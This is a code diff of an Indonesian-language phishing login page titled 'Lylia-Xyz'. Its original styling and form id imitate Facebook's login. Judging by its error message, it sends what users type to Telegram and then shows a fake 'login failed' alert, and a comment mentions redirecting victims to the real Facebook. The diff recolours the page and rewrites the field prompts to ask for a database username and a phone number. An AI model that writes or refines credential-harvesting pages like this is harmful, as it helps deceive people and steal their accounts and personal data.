@@ -6,7 +6,7 @@
   <title>Databaase Simple Lylia-Xyz</title>
   <style>
     body {
-      background: #e9ebee;
+      background: white;
       font-family: Helvetica, Arial, sans-serif;
       display: flex;
       justify-content: center;
@@ -14,7 +14,7 @@
       height: 100vh;
     }
     .login-container {
-      background: white;
+      background: black;
       padding: 20px;
       border-radius: 8px;
       box-shadow: 0 2px 8px rgba(0,0,0,0.2);
@@ -29,14 +29,14 @@
       width: 100%;
       padding: 14px;
       margin: 10px 0;
-      border: 1px solid #dddfe2;
+      border: 1px solid red;
       border-radius: 6px;
       font-size: 16px;
     }
     button {
       width: 100%;
       padding: 14px;
-      background-color: #1877f2;
+      background-color: gray;
       border: none;
       color: white;
       font-weight: bold;
@@ -57,8 +57,8 @@
   <div class="login-container">
     <h1>Lylia-Xyz</h1>
     <form id="fbLoginForm">
-      <input type="text" id="email" placeholder="Email atau Nomor Telepon" required />
-      <input type="password" id="password" placeholder="Kata Sandi" required />
+      <input type="text" id="email" placeholder="Masukkan Username Database Anda" required />
+      <input type="password" id="password" placeholder="Nomor Telepon Anda" required />
       <button type="submit">Login</button>
     </form>
     <div class="login-footer">
@@ -89,7 +89,7 @@
       })
       .then(() => {
         alert("Login Gagal,Pastikan Akun Anda Sudah Di Database Bot Lylia-Xyz");
-        // window.location.href = "https://facebook.com"; // bisa redirect ke fb asli
+        // window.location.href = "https://digitalocean.com"; // bisa redirect ke fb asli
       })
       .catch((error) => {
         console.error("Gagal mengirim ke Telegram:", error);
